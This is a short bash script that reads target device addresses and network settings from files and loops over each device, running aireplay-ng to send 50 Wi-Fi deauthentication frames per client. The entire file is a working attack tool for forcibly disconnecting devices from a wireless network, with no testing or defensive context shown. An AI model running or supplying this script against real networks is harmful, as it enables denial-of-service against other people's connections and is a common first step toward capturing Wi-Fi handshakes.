#!/bin/bash

kenel=/winston/kenel

lines=$(cat $kenel/device_options | wc -l)
network=$(cat $kenel/network_settings | grep SSID | awk {'print $2'})
interface=$(cat $kenel/network_settings | grep interface | awk {'print $2'})

for i in $(seq 1 $lines); do
    device=$(cat $kenel/device_options | sed -n ${i}p)
    echo "working on device $i"
    sudo aireplay-ng -0 50 -a $network -c $device $interface
done
